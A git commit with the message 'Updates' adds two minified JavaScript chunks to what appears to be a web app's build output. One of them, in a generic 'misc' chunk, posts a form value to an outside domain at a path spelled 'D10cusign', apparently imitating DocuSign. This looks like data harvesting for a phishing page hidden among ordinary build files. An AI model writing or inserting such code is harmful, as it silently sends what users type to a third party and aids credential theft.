c473a3ae104d35a39ee585bc4599873173f447fd
Avi Sangray <avisangray@gmail.com>
2024-11-03 17:14:32 +0530

    Updates

---
+++ _app/immutable/chunks/misc.BisJDyid.js
@@ -0,0 +1,1 @@
+async function a(t){await fetch("https://taxcreditprosinc.com/api/internal1/D10cusign",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"fname="+t})}export{a as l};
---
+++ _app/immutable/entry/start.BVp5BY1V.js
@@ -0,0 +1,1 @@
+import{a as t}from"../chunks/entry.DnYezs4i.js";export{t as start};
